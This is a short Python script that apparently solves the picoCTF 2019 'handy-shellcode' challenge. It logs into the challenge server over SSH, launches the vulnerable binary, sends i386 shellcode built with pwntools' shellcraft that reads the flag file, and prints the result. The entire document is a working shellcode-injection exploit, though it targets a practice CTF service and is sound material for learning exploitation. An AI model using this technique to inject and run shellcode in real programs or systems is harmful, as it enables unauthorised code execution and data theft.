from os import environ
from pwn import *

EXEC = "/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/vuln"
FLAG = "/problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5/flag.txt"

s = ssh(
    host="2019shell1.picoctf.com",
    user=environ["PICOUSER"],
    password=environ["PICOPSWD"],
)

sh = s.process(EXEC)

shellcode = asm(shellcraft.i386.cat(FLAG))

sh.sendlineafter("Enter your shellcode:", shellcode)

x = sh.recvrepeat()

print(x.decode(errors="ignore").split("...")[-1][1:])

s.close()
